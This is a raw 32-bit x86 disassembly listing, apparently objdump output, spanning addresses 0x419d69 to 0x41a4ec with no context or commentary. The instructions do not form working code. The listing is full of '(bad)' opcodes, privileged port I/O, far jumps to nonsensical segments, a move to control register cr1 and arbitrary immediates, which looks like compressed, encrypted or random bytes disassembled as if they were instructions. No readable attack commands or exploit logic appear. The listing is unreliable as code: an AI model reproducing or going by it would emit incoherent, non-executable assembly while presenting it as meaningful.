  419d69:	(bad)  
  419d6b:	daa    
  419d6c:	mov    edi,DWORD PTR [ebx+ecx*8]
  419d6f:	loop   0x419cf5
  419d71:	inc    ecx
  419d72:	loop   0x419de6
  419d74:	adc    dh,BYTE PTR ds:0xe7445a18
  419d7a:	and    ah,bh
  419d7c:	xor    DWORD PTR [ecx],ecx
  419d7e:	jns    0x419de8
  419d80:	aam    0xd6
  419d82:	(bad)  
  419d83:	rcl    BYTE PTR [ebp-0x762a51ed],1
  419d89:	ja     0x419d50
  419d8b:	jle    0x419d31
  419d8d:	dec    ebx
  419d8e:	std    
  419d8f:	add    al,0xd8
  419d91:	or     bh,dl
  419d93:	enter  0xe390,0x65
  419d97:	sub    DWORD PTR [esi],esp
  419d99:	in     al,dx
  419d9a:	cmp    bl,BYTE PTR [edx-0x4]
  419d9d:	sub    al,0x53
  419d9f:	cmp    esi,esi
  419da1:	cdq    
  419da2:	xlat   BYTE PTR ds:[bx]
  419da4:	xchg   esp,esp
  419da6:	loope  0x419da2
  419da8:	fwait
  419da9:	pop    ds
  419daa:	sar    DWORD PTR ds:0x5da0b8fd,0x1e
  419db1:	out    dx,al
  419db2:	ror    dh,cl
  419db4:	xor    BYTE PTR [esi+ebp*8+0x6843e504],bl
  419dbb:	sub    eax,0xef29859d
  419dc0:	dec    eax
  419dc1:	xchg   DWORD PTR [esi],eax
  419dc3:	pop    ss
  419dc4:	sub    ch,BYTE PTR [ebx]
  419dc6:	xchg   edi,eax
  419dc7:	jae    0x419e42
  419dc9:	imul   ebx,DWORD PTR [ebp+ebp*4-0x1b],0xe23f6189
  419dd1:	mov    ah,0x34
  419dd3:	ins    BYTE PTR es:[edi],dx
  419dd4:	mov    al,ds:0x85b4aa4b
  419dd9:	jb     0x419d87
  419ddb:	cmp    eax,0x36125f9d
  419de0:	(bad)  
  419de1:	out    dx,eax
  419de2:	cmp    eax,0xc953b1c1
  419de7:	sar    DWORD PTR [ebx-0x3c74f241],0xe6
  419dee:	sub    BYTE PTR [edx],bl
  419df0:	ins    DWORD PTR es:[edi],dx
  419df1:	into   
  419df2:	test   esi,edi
  419df4:	ret    0x26aa
  419df7:	mov    bl,0xda
  419df9:	and    ebx,DWORD PTR [ebx+0x7e147ca5]
  419dff:	add    DWORD PTR [eax-0x4a4a06ea],esi
  419e05:	in     eax,0x8d
  419e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e08:	mov    esp,0x725e056d
  419e0d:	pop    es
  419e0e:	pop    esi
  419e0f:	imul   edi,DWORD PTR [esi+0x6837e322],0xce66f230
  419e19:	dec    ebp
  419e1a:	rcl    BYTE PTR [esi],1
  419e1c:	jl     0x419dbf
  419e1e:	lds    edx,FWORD PTR [edi+0x27]
  419e21:	icebp  
  419e22:	loopne 0x419e51
  419e24:	xor    DWORD PTR [edi],0xd51b936a
  419e2a:	and    al,0x43
  419e2c:	xlat   BYTE PTR ds:[ebx]
  419e2d:	push   0x46181a20
  419e32:	xor    DWORD PTR [ebx+0xf],esi
  419e35:	retf   0x35d1
  419e38:	(bad)  
  419e39:	fidivr DWORD PTR [esi]
  419e3b:	aas    
  419e3c:	jno    0x419eaa
  419e3e:	mov    dh,0xc4
  419e40:	rcl    BYTE PTR ds:0x49a0ac9b,1
  419e46:	and    edi,DWORD PTR [edi-0x1f91d81b]
  419e4c:	xor    DWORD PTR [ebp-0x5ad1308b],ebx
  419e52:	mov    ds,WORD PTR [ebx+0x163d2d6d]
  419e58:	inc    esp
  419e59:	outs   dx,DWORD PTR ds:[esi]
  419e5a:	imul   edx,DWORD PTR [edx+0x52],0x1e397f94
  419e61:	aam    0x28
  419e63:	popf   
  419e64:	or     cl,BYTE PTR [eax-0x42435fed]
  419e6a:	pop    edx
  419e6b:	repnz fld DWORD PTR [eax-0x5]
  419e6f:	mov    edx,0x9c4453f6
  419e74:	mov    WORD PTR [ecx],ds
  419e76:	push   es
  419e77:	push   es
  419e78:	push   0x2b
  419e7a:	jb     0x419e85
  419e7c:	scas   eax,DWORD PTR es:[edi]
  419e7d:	aas    
  419e7e:	adc    DWORD PTR [eax+eiz*4-0x96767bd],esp
  419e85:	or     DWORD PTR [ecx-0x26],edx
  419e88:	pop    edi
  419e89:	xchg   ebx,eax
  419e8a:	dec    edx
  419e8b:	clc    
  419e8c:	dec    edx
  419e8d:	cmp    DWORD PTR [ebx+0x50e127a4],0x4d68b723
  419e97:	inc    ecx
  419e98:	mov    eax,0x964a0388
  419e9d:	and    DWORD PTR [ebp+0x30],edx
  419ea0:	add    edi,DWORD PTR [esi-0xae6c640]
  419ea6:	std    
  419ea7:	div    BYTE PTR [eax+0x53]
  419eaa:	pusha  
  419eab:	mov    esp,0xeff652c1
  419eb0:	sbb    bl,0xc
  419eb3:	sub    DWORD PTR [edx+0x53ec3154],0xffffffc3
  419eba:	jns    0x419e5f
  419ebc:	mov    DWORD PTR [edi-0x7a],esi
  419ebf:	mov    WORD PTR [edx-0xe3a91f0],cs
  419ec5:	enter  0x95a1,0x2
  419ec9:	lods   eax,DWORD PTR ds:[esi]
  419eca:	lods   al,BYTE PTR ds:[esi]
  419ecb:	push   esp
  419ecc:	fs inc edx
  419ece:	xor    bl,BYTE PTR [ebp-0x12]
  419ed1:	jmp    0x419f0a
  419ed3:	aad    0x64
  419ed5:	and    bl,BYTE PTR [eax-0x70]
  419ed8:	daa    
  419ed9:	mov    ebp,eax
  419edb:	push   0x6312bfd7
  419ee0:	cmp    al,0xd5
  419ee2:	inc    esi
  419ee3:	mov    ds:0x437be76c,eax
  419ee8:	ds scas al,BYTE PTR es:[edi]
  419eea:	cmp    al,BYTE PTR [edi-0x5aa5c217]
  419ef0:	mov    dh,0x6
  419ef2:	mov    ch,0xa5
  419ef4:	dec    ecx
  419ef5:	ins    DWORD PTR es:[edi],dx
  419ef6:	mov    edx,0x7a88ca21
  419efb:	(bad)  
  419efc:	repnz outs dx,DWORD PTR ds:[esi]
  419efe:	sub    ebp,DWORD PTR [esi+0x133db46a]
  419f04:	mov    bh,0x2d
  419f06:	or     al,0xbb
  419f08:	push   es
  419f09:	push   0x21
  419f0b:	ret    
  419f0c:	hlt    
  419f0d:	dec    edx
  419f0e:	adc    DWORD PTR [esi],ebx
  419f10:	jge    0x419ef5
  419f12:	test   ebx,esp
  419f14:	sub    ebp,DWORD PTR [ebp+0x30f585cc]
  419f1a:	repz sahf 
  419f1c:	ja     0x419f56
  419f1e:	pop    ebp
  419f1f:	push   edx
  419f20:	clc    
  419f21:	jge    0x419ed4
  419f23:	stos   BYTE PTR es:[edi],al
  419f24:	lea    edi,[edi+0x15]
  419f27:	aaa    
  419f28:	enter  0x2034,0x4a
  419f2c:	call   0xcd5a04c9
  419f31:	sub    DWORD PTR [esi-0x8],ebp
  419f34:	jne    0x419ed8
  419f36:	(bad)  
  419f37:	jmp    0xdf17:0xb0a1a9fe
  419f3e:	pop    ebx
  419f3f:	mov    cl,0xa5
  419f41:	push   ss
  419f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f43:	adc    al,0xeb
  419f45:	dec    edi
  419f46:	pop    ds
  419f47:	fdivr  st(5),st
  419f49:	sbb    al,0x3b
  419f4b:	std    
  419f4c:	sub    eax,0xbec04e90
  419f51:	or     eax,0xbf14a5b4
  419f56:	jmp    0x2a62836d
  419f5b:	and    BYTE PTR [edi],cl
  419f5d:	je     0x419fc4
  419f5f:	xchg   esp,eax
  419f60:	fisubr WORD PTR [edx+0x2e50494e]
  419f66:	in     al,0xb
  419f68:	cmc    
  419f69:	add    bh,BYTE PTR [edi+0x77]
  419f6c:	mov    bh,0x5d
  419f6e:	sar    DWORD PTR [eax],1
  419f70:	repnz dec edi
  419f72:	dec    eax
  419f73:	mov    bh,0xf2
  419f75:	mov    cl,0xe0
  419f77:	fs nop
  419f79:	cmp    eax,0xc00ea8c1
  419f7e:	mov    cl,0x6d
  419f80:	inc    ecx
  419f81:	imul   edx,edx,0xfffffff9
  419f84:	(bad)  
  419f85:	retf   
  419f86:	ret    0xb07a
  419f89:	iret   
  419f8a:	mov    ch,0x0
  419f8c:	push   edx
  419f8d:	sub    al,0xc3
  419f8f:	es mov eax,0x304af191
  419f95:	(bad)  
  419f96:	retf   
  419f97:	mov    esi,0xbf094a7e
  419f9c:	inc    esp
  419f9d:	cmp    DWORD PTR [edx-0x73bb544d],ebx
  419fa3:	add    cl,ch
  419fa5:	and    eax,0x30aedf96
  419faa:	xor    edx,DWORD PTR [edx+0x5620358c]
  419fb0:	xor    BYTE PTR [eax+0x17f629fc],ah
  419fb6:	mov    BYTE PTR [ebp-0x1b18ae6],bh
  419fbc:	enter  0xbf57,0x2f
  419fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fc1:	pusha  
  419fc2:	xchg   esp,eax
  419fc3:	jmp    0x6026facc
  419fc8:	aam    0xb0
  419fca:	push   edi
  419fcb:	(bad)  
  419fcc:	leave  
  419fcd:	mov    cl,0xfc
  419fcf:	xchg   esp,eax
  419fd0:	js     0x41a017
  419fd2:	push   esp
  419fd3:	xchg   ecx,eax
  419fd4:	iret   
  419fd5:	loopne 0x419f9b
  419fd7:	in     al,dx
  419fd8:	xchg   ebp,eax
  419fd9:	jl     0x419f66
  419fdb:	jo     0x41a023
  419fdd:	ins    DWORD PTR es:[edi],dx
  419fde:	rcl    DWORD PTR [ebx-0x4f],1
  419fe1:	dec    esp
  419fe2:	push   ebp
  419fe3:	loope  0x419f93
  419fe5:	dec    edi
  419fe6:	cmp    al,BYTE PTR [edi]
  419fe8:	ret    
  419fe9:	fild   QWORD PTR [esi]
  419feb:	mov    ds:0xcca41af8,eax
  419ff0:	inc    ebp
  419ff1:	jmp    0x3566:0xacf493aa
  419ff8:	in     al,0x89
  419ffa:	(bad)  
  419ffb:	adc    dl,BYTE PTR [ebp-0x1481bd3e]
  41a001:	cs adc eax,0x40839784
  41a007:	shl    DWORD PTR [edx-0x68d1e743],cl
  41a00d:	mov    al,0xb0
  41a00f:	std    
  41a010:	xchg   esi,eax
  41a011:	loopne 0x41a08f
  41a013:	repz pop edx
  41a015:	lea    ecx,[edi-0x63]
  41a018:	mov    eax,ds:0x872a9d28
  41a01d:	mov    ah,0x7a
  41a01f:	push   edi
  41a020:	jns    0x41a056
  41a022:	in     al,0x80
  41a024:	mov    es,WORD PTR [edi-0x10004eb2]
  41a02a:	(bad)  
  41a02b:	addr16 out 0x41,al
  41a02e:	aas    
  41a02f:	jecxz  0x41a082
  41a031:	inc    ebx
  41a032:	mov    esi,0x92486661
  41a037:	add    DWORD PTR [eax+0x7a],edx
  41a03a:	(bad)  
  41a03d:	sbb    edx,DWORD PTR [edx+0x58]
  41a040:	inc    esi
  41a041:	xor    eax,0x79c0a6a5
  41a046:	and    cl,BYTE PTR [eax+0x40e4d54d]
  41a04c:	adc    cl,al
  41a04e:	ret    0xacae
  41a051:	loopne 0x41a011
  41a053:	mov    bh,0xf1
  41a055:	pop    edx
  41a056:	outs   dx,DWORD PTR ds:[esi]
  41a057:	dec    eax
  41a058:	ja     0x41a05a
  41a05a:	out    dx,eax
  41a05b:	call   DWORD PTR ds:0x6c830e52
  41a061:	repnz in al,0xfe
  41a064:	jmp    0x3a439195
  41a069:	int3   
  41a06a:	ins    DWORD PTR es:[edi],dx
  41a06b:	out    dx,al
  41a06c:	lahf   
  41a06d:	add    DWORD PTR [edx+0x3da4ba77],ebx
  41a073:	jne    0x41a0f4
  41a075:	push   cs
  41a076:	ja     0x41a0de
  41a078:	mov    BYTE PTR [eax+eiz*1-0x488445c2],al
  41a07f:	jl     0x41a0a1
  41a081:	mov    edi,DWORD PTR [ebp-0x598949c1]
  41a087:	dec    ebx
  41a088:	xor    esp,DWORD PTR [eax+ebx*1]
  41a08b:	jno    0x41a02c
  41a08d:	in     al,dx
  41a08e:	cmp    al,0x91
  41a090:	or     BYTE PTR [esi],ch
  41a092:	mov    esp,0x5f614080
  41a097:	sar    DWORD PTR [ebx-0x48],0x7b
  41a09b:	cmp    DWORD PTR [esi],ebp
  41a09d:	cmp    eax,0xa9b0cbb1
  41a0a2:	push   es
  41a0a3:	xchg   esi,eax
  41a0a4:	loopne 0x41a051
  41a0a6:	xor    al,0xbd
  41a0a8:	jecxz  0x41a08a
  41a0aa:	pop    ebx
  41a0ab:	mov    cl,0x4e
  41a0ad:	jle    0x41a0b1
  41a0af:	pop    edx
  41a0b0:	loop   0x41a07e
  41a0b2:	repz test al,0x2c
  41a0b5:	lahf   
  41a0b6:	retf   
  41a0b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0b9:	adc    bh,BYTE PTR [ecx]
  41a0bb:	add    DWORD PTR [ecx-0x49],edx
  41a0be:	loope  0x41a12f
  41a0c0:	pop    ebx
  41a0c1:	mov    edx,edi
  41a0c3:	mov    bl,0x50
  41a0c5:	inc    esi
  41a0c6:	add    ecx,DWORD PTR [ebp+0x76]
  41a0c9:	stos   BYTE PTR es:[di],al
  41a0cb:	gs iret 
  41a0cd:	aam    0xab
  41a0cf:	mov    ah,0x8c
  41a0d1:	inc    ebx
  41a0d2:	mov    edi,0xf3e38a3b
  41a0d7:	mov    al,ds:0xf13aeb4f
  41a0dc:	jno    0x41a0c4
  41a0de:	xor    edx,ebx
  41a0e0:	pushf  
  41a0e1:	push   0xa5e1f1f9
  41a0e6:	scas   al,BYTE PTR es:[edi]
  41a0e7:	les    ebp,FWORD PTR [edi-0x69]
  41a0ea:	sub    al,0x9d
  41a0ec:	in     eax,dx
  41a0ed:	adc    cl,0x78
  41a0f0:	pushf  
  41a0f1:	jno    0x41a080
  41a0f3:	call   0xee275796
  41a0f8:	xchg   ebx,eax
  41a0f9:	xor    ebx,edx
  41a0fb:	xor    ebx,DWORD PTR [edx]
  41a0fd:	inc    edi
  41a0fe:	mov    bl,0xd7
  41a100:	xor    DWORD PTR [esi*1+0x7f174097],ebx
  41a107:	sbb    dh,BYTE PTR [edi+eiz*1+0x671ab567]
  41a10e:	add    ah,BYTE PTR [edx+ebx*1+0x36]
  41a112:	push   edx
  41a113:	or     DWORD PTR [ebp+0x50],ebp
  41a116:	sub    eax,0x304c4589
  41a11b:	(bad)  
  41a11c:	cmp    DWORD PTR [esi-0xd832466],ebx
  41a122:	jg     0x41a0c1
  41a124:	loop   0x41a138
  41a126:	push   ebx
  41a127:	daa    
  41a128:	test   DWORD PTR [edi+eiz*4],edx
  41a12b:	rol    DWORD PTR [ecx+0x30f2c17c],0xf0
  41a132:	ds out dx,al
  41a134:	jg     0x41a0be
  41a136:	cmc    
  41a137:	mov    ebp,0x2d8ab8aa
  41a13c:	xchg   esp,eax
  41a13d:	dec    esp
  41a13e:	pop    ss
  41a13f:	retf   
  41a140:	add    DWORD PTR ds:0x403e4689,esi
  41a146:	outs   dx,DWORD PTR ds:[esi]
  41a147:	imul   DWORD PTR [ebp-0x6b41f3d9]
  41a14d:	mov    al,0x4d
  41a14f:	pop    esp
  41a150:	pop    edi
  41a151:	pop    ebp
  41a152:	lods   eax,DWORD PTR ds:[esi]
  41a153:	or     BYTE PTR [ebx+0x67449f14],bh
  41a159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a15a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a15b:	mov    DWORD PTR [edx+0xd15f574],edi
  41a161:	lods   al,BYTE PTR ds:[esi]
  41a162:	jmp    0x87df:0x24fc9947
  41a169:	xor    edx,DWORD PTR [ebp+0x46d2b865]
  41a16f:	mov    gs,WORD PTR [ebx+0x291493e0]
  41a175:	pop    es
  41a176:	hlt    
  41a177:	loop   0x41a18c
  41a179:	(bad)  
  41a17a:	lock or ah,BYTE PTR [ecx-0x533d1f73]
  41a181:	daa    
  41a182:	das    
  41a183:	in     eax,dx
  41a184:	(bad)  
  41a185:	xchg   BYTE PTR ds:[ebp-0x30],dh
  41a189:	jg     0x41a1ca
  41a18b:	add    al,0x45
  41a18d:	scas   al,BYTE PTR es:[edi]
  41a18e:	xchg   esp,eax
  41a18f:	mov    ebp,0x3f07baec
  41a194:	inc    edi
  41a195:	xor    DWORD PTR [ebp+0x2dd07a14],0x1
  41a19c:	pop    edx
  41a19d:	cmp    BYTE PTR [ecx+0x325b6f36],0x3f
  41a1a4:	popf   
  41a1a5:	fstp   QWORD PTR ds:0x6491ef6d
  41a1ab:	push   cs
  41a1ac:	cmp    ebp,edi
  41a1ae:	sbb    edx,DWORD PTR [eax*2+0x4f8e2b05]
  41a1b5:	or     ecx,DWORD PTR [eax-0x79]
  41a1b8:	mov    ah,ch
  41a1ba:	rol    DWORD PTR [ebx-0x6a334368],1
  41a1c0:	aas    
  41a1c1:	mov    ebx,0xe9ddf8cb
  41a1c6:	in     eax,dx
  41a1c7:	lea    eax,[esp+ecx*4-0x2c]
  41a1cb:	xor    eax,0x354d30b5
  41a1d0:	xchg   esp,eax
  41a1d1:	xor    eax,0x4d61c3ce
  41a1d6:	xchg   esp,eax
  41a1d7:	or     esp,DWORD PTR [eax]
  41a1d9:	and    ah,bh
  41a1db:	inc    esi
  41a1dc:	ret    0x9a29
  41a1df:	call   edx
  41a1e1:	and    DWORD PTR [ebx*4+0x67ab0bf0],ebp
  41a1e8:	sub    cl,BYTE PTR [ecx-0x7f]
  41a1eb:	out    dx,al
  41a1ec:	and    ch,BYTE PTR ds:0x953cbd00
  41a1f2:	icebp  
  41a1f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1f4:	outs   dx,DWORD PTR ds:[esi]
  41a1f5:	adc    eax,0xc617784c
  41a1fa:	fsub   st,st(6)
  41a1fc:	cli    
  41a1fd:	push   ebx
  41a1fe:	and    al,0x55
  41a200:	inc    esi
  41a201:	jae    0x41a1aa
  41a203:	push   ds
  41a204:	pop    ebx
  41a205:	rcl    BYTE PTR [esi-0x4e76de7d],0x1a
  41a20c:	mov    eax,ds:0xc68d6fdf
  41a211:	cmp    ebx,esi
  41a213:	and    dl,dh
  41a215:	fisttp WORD PTR [ebx+0x3c2ed6e]
  41a21b:	inc    esp
  41a21c:	xchg   edx,eax
  41a21d:	mov    ebp,0x77e68ebd
  41a222:	pop    esi
  41a223:	jo     0x41a1ff
  41a225:	mov    cl,0x43
  41a227:	imul   eax,DWORD PTR [ecx-0x2fc53312],0xd35d3c7c
  41a231:	cs adc esi,0xebcad02e
  41a238:	mov    eax,ds:0x75e7479
  41a23d:	js     0x41a23e
  41a23f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a240:	jno    0x41a27e
  41a242:	xor    BYTE PTR [ebp-0x38d27d09],cl
  41a248:	stos   DWORD PTR es:[edi],eax
  41a249:	jle    0x41a1e8
  41a24b:	sbb    ch,BYTE PTR [ebx-0x3131dd92]
  41a251:	sbb    eax,0x9716c796
  41a256:	mov    ebx,0x1601629b
  41a25b:	(bad)  
  41a25c:	(bad)  
  41a25d:	sahf   
  41a25e:	mov    bh,0xb9
  41a260:	retf   0x1b11
  41a263:	pop    ebp
  41a264:	mov    ds:0x7b62bbdb,eax
  41a269:	repnz out 0x2c,eax
  41a26c:	outs   dx,BYTE PTR ds:[esi]
  41a26d:	fcom   QWORD PTR [esi-0x354cf8ed]
  41a273:	lods   al,BYTE PTR ds:[esi]
  41a274:	js     0x41a26a
  41a276:	inc    ebx
  41a277:	pop    ss
  41a278:	add    BYTE PTR [ebp-0x2f978206],ch
  41a27e:	call   0x8b9f8a37
  41a283:	js     0x41a226
  41a285:	push   esp
  41a286:	inc    esi
  41a287:	fdivr  st(1),st
  41a289:	cmp    al,0x9a
  41a28b:	fdivr  st,st(5)
  41a28d:	ins    BYTE PTR es:[edi],dx
  41a28e:	stos   DWORD PTR es:[edi],eax
  41a28f:	mov    al,0x42
  41a291:	iret   
  41a292:	js     0x41a2e3
  41a294:	push   edi
  41a295:	je     0x41a230
  41a297:	outs   dx,DWORD PTR ds:[esi]
  41a298:	xchg   esp,eax
  41a299:	hlt    
  41a29a:	(bad)  
  41a29b:	pop    ebx
  41a29c:	repz scas eax,DWORD PTR es:[edi]
  41a29e:	fldcw  WORD PTR ss:[eax*8+0x4bfdb08c]
  41a2a6:	std    
  41a2a7:	xor    BYTE PTR [esi],dl
  41a2a9:	ror    esp,0xfd
  41a2ac:	daa    
  41a2ad:	popf   
  41a2ae:	(bad)  [ebp-0x77c8d7f4]
  41a2b4:	mov    edi,0xdc3b26a4
  41a2b9:	mov    dl,0x6
  41a2bb:	pusha  
  41a2bc:	pop    ebx
  41a2bd:	xchg   edi,eax
  41a2be:	cmp    BYTE PTR [edi],dl
  41a2c0:	sub    al,0xd3
  41a2c2:	mov    bl,0x2c
  41a2c4:	aam    0xe0
  41a2c6:	mov    cl,cl
  41a2c8:	mov    edi,0x94854b6d
  41a2cd:	xor    bl,cl
  41a2cf:	cmp    al,0x53
  41a2d1:	gs xor al,0xd2
  41a2d4:	dec    ebp
  41a2d5:	inc    edi
  41a2d6:	mov    cl,0xb8
  41a2d8:	aam    0xc0
  41a2da:	scas   al,BYTE PTR es:[edi]
  41a2db:	add    BYTE PTR [edi+0x32bdc914],bl
  41a2e1:	popf   
  41a2e2:	sub    ch,BYTE PTR [ebx]
  41a2e4:	out    0x2d,al
  41a2e6:	or     edx,DWORD PTR [edi+0x2a]
  41a2e9:	cmp    eax,0x87e1b87
  41a2ee:	mov    bl,0x77
  41a2f0:	popa   
  41a2f1:	mov    eax,ds:0xc5e4449b
  41a2f6:	daa    
  41a2f7:	add    ebx,esi
  41a2f9:	jmp    0x4ba91e21
  41a2fe:	stc    
  41a2ff:	jp     0x41a2c7
  41a301:	iretw  
  41a303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a304:	dec    edx
  41a305:	pop    edi
  41a306:	sbb    ebp,eax
  41a308:	pop    ebp
  41a309:	inc    ebx
  41a30a:	fwait
  41a30b:	mov    eax,ds:0x8dbf35f
  41a310:	adc    BYTE PTR [edx+0x59095045],dh
  41a316:	jae    0x41a2b6
  41a318:	in     eax,0xc5
  41a31a:	lods   al,BYTE PTR ds:[si]
  41a31c:	out    dx,eax
  41a31d:	mov    ebx,0x2878de89
  41a322:	inc    eax
  41a323:	xor    BYTE PTR [esi+0x32],ah
  41a326:	jno    0x41a372
  41a328:	icebp  
  41a329:	mov    cr1,esi
  41a32c:	pushf  
  41a32d:	push   ebp
  41a32e:	xchg   edi,eax
  41a32f:	scas   eax,DWORD PTR es:[edi]
  41a330:	mov    dh,0x31
  41a332:	sub    eax,DWORD PTR [eax-0x66e4d2]
  41a338:	inc    ebx
  41a339:	(bad)  
  41a33a:	fwait
  41a33b:	stos   DWORD PTR es:[edi],eax
  41a33c:	les    ebp,FWORD PTR [eax]
  41a33e:	stos   BYTE PTR es:[edi],al
  41a33f:	call   0x6321:0x26fa4f38
  41a346:	and    ah,dh
  41a348:	xor    al,0x2b
  41a34a:	mov    ebp,0x12741411
  41a34f:	push   edi
  41a350:	in     eax,0xf1
  41a352:	push   esi
  41a353:	add    bh,ch
  41a355:	jl     0x41a383
  41a357:	retf   0x7442
  41a35a:	fcmovne st,st(4)
  41a35c:	adc    eax,0xce4f88ec
  41a361:	outs   dx,BYTE PTR ds:[esi]
  41a362:	fisubr WORD PTR [edx-0x12]
  41a365:	xor    BYTE PTR [edx-0x43f3a7cb],al
  41a36b:	xchg   bh,dl
  41a36d:	inc    ecx
  41a36e:	test   BYTE PTR [eax],dl
  41a370:	pop    sp
  41a372:	bound  eax,QWORD PTR [ebx]
  41a374:	stc    
  41a375:	push   ecx
  41a376:	hlt    
  41a377:	scas   eax,DWORD PTR es:[edi]
  41a378:	mov    ebx,0xdcbd763
  41a37d:	gs adc eax,0x587c1fbe
  41a383:	push   ecx
  41a384:	mov    ds:0xd9ce37a2,eax
  41a389:	sub    eax,0xbeb98d8a
  41a38e:	inc    ebp
  41a38f:	add    al,0xef
  41a391:	mov    dh,0x79
  41a393:	dec    ebx
  41a394:	push   eax
  41a395:	popf   
  41a396:	aaa    
  41a397:	outs   dx,DWORD PTR ds:[esi]
  41a398:	xchg   ebx,eax
  41a399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a39b:	sub    al,BYTE PTR [eax-0x5e9f897]
  41a3a1:	add    eax,0x23478f21
  41a3a6:	hlt    
  41a3a7:	in     eax,dx
  41a3a8:	cmp    bh,BYTE PTR [ecx-0xa402a85]
  41a3ae:	sbb    dh,BYTE PTR [ebx]
  41a3b0:	popf   
  41a3b1:	fbstp  TBYTE PTR [edi]
  41a3b3:	add    eax,0xc1ac1007
  41a3b8:	test   al,0xc0
  41a3ba:	add    esi,DWORD PTR fs:[ecx-0x24]
  41a3be:	les    edi,FWORD PTR [eax-0x10]
  41a3c1:	mov    WORD PTR [edx+0x7fc10670],gs
  41a3c7:	jg     0x41a42a
  41a3c9:	aad    0x27
  41a3cb:	les    eax,FWORD PTR [ebx+0xd]
  41a3ce:	jl     0x41a38e
  41a3d0:	dec    ecx
  41a3d1:	dec    edi
  41a3d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3d3:	xchg   edi,eax
  41a3d4:	adc    al,0x53
  41a3d6:	mov    dh,0x74
  41a3d8:	xor    edi,DWORD PTR [ebx+0x59d597d2]
  41a3de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3df:	lahf   
  41a3e0:	sbb    eax,0x91af79fb
  41a3e5:	mov    ah,0x9d
  41a3e7:	push   ecx
  41a3e8:	test   al,0xcf
  41a3ea:	mov    esi,0xf4876eb8
  41a3ef:	pop    edi
  41a3f0:	mov    esi,0x60f4a79d
  41a3f5:	and    esi,DWORD PTR [edx]
  41a3f7:	imul   edx,ebp,0x1068fa43
  41a3fd:	fadd   st,st(2)
  41a3ff:	mov    dl,0xd6
  41a401:	and    al,BYTE PTR [edi]
  41a403:	cmp    esp,DWORD PTR [edi]
  41a405:	adc    BYTE PTR [ebx+0x3bbf5f61],ch
  41a40b:	adc    BYTE PTR [ebx+ecx*2-0x3e9eb258],dl
  41a412:	out    dx,al
  41a413:	clc    
  41a414:	mov    edx,0x6508a660
  41a419:	imul   DWORD PTR [edi+edx*1+0xc]
  41a41d:	jmp    0x41a46c
  41a41f:	mov    BYTE PTR [edx],dl
  41a421:	in     eax,0xe6
  41a423:	loope  0x41a3db
  41a425:	aaa    
  41a426:	inc    ebx
  41a427:	rcl    DWORD PTR [ebp+0x51],1
  41a42a:	iret   
  41a42b:	pop    ss
  41a42c:	leave  
  41a42d:	jmp    0xfab3:0x323c6e91
  41a434:	pop    eax
  41a435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a436:	and    bh,0x87
  41a439:	pusha  
  41a43a:	push   esi
  41a43b:	repz pop ebp
  41a43d:	test   BYTE PTR [edx+0x63],dh
  41a440:	cmp    DWORD PTR [ebx-0x4f],eax
  41a443:	imul   ebp,ecx,0xffffff85
  41a446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a447:	ss in  eax,dx
  41a449:	hlt    
  41a44a:	mov    esp,0x67872da1
  41a44f:	sub    al,0x6c
  41a451:	mov    ebp,0xdfe87c3c
  41a456:	or     eax,0x288f7c77
  41a45b:	das    
  41a45c:	mov    ch,0xfe
  41a45e:	pop    ecx
  41a45f:	(bad)  
  41a460:	in     eax,0x8b
  41a462:	sub    ebx,DWORD PTR [edx-0x69]
  41a465:	retf   0x82aa
  41a468:	fidivr DWORD PTR [edi-0x38]
  41a46b:	xchg   esp,eax
  41a46c:	fadd   QWORD PTR [edx+eiz*2]
  41a46f:	rcr    DWORD PTR [ecx],cl
  41a471:	sub    ah,BYTE PTR [esi-0x23855eab]
  41a477:	mov    bh,BYTE PTR [edi+0x71]
  41a47a:	int    0x46
  41a47c:	bound  ebx,QWORD PTR [ebx-0x40dd2255]
  41a482:	out    0x73,eax
  41a484:	das    
  41a485:	mov    BYTE PTR [edi],al
  41a487:	fmul   QWORD PTR [edx-0x5dfe46e8]
  41a48d:	adc    al,0x1
  41a48f:	outs   dx,DWORD PTR ds:[esi]
  41a490:	loope  0x41a420
  41a492:	adc    dh,dh
  41a494:	mov    al,0x56
  41a496:	mov    WORD PTR [eax+eiz*1+0x74],es
  41a49a:	jo     0x41a423
  41a49c:	mov    esi,edi
  41a49e:	or     ch,cl
  41a4a0:	jle    0x41a4f9
  41a4a2:	and    ah,bl
  41a4a4:	dec    edi
  41a4a5:	xchg   edi,eax
  41a4a6:	mov    edi,0x88dacab6
  41a4ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4ac:	inc    ebp
  41a4ad:	pop    esi
  41a4ae:	cmp    ah,BYTE PTR [esi+esi*8]
  41a4b1:	stos   DWORD PTR es:[edi],eax
  41a4b2:	fisttp QWORD PTR [ebx]
  41a4b4:	mov    ah,0xeb
  41a4b6:	arpl   cx,si
  41a4b8:	sbb    ch,al
  41a4ba:	adc    eax,0xbb13cebc
  41a4bf:	dec    esi
  41a4c0:	pop    es
  41a4c1:	shr    dh,0x2c
  41a4c4:	mov    ecx,0x54bea338
  41a4c9:	inc    ebp
  41a4ca:	push   eax
  41a4cb:	push   esi
  41a4cc:	ja     0x41a548
  41a4ce:	mov    WORD PTR [ebx-0x361911d9],?
  41a4d4:	adc    DWORD PTR [ecx-0x50e6f136],ecx
  41a4da:	or     bl,bh
  41a4dc:	stos   DWORD PTR es:[edi],eax
  41a4dd:	mov    ebp,0x6cd2e965
  41a4e2:	clc    
  41a4e3:	adc    dh,BYTE PTR [ebx+eax*4-0x5b910a94]
  41a4ea:	lock scas eax,DWORD PTR es:[edi]
  41a4ec:	pushf  
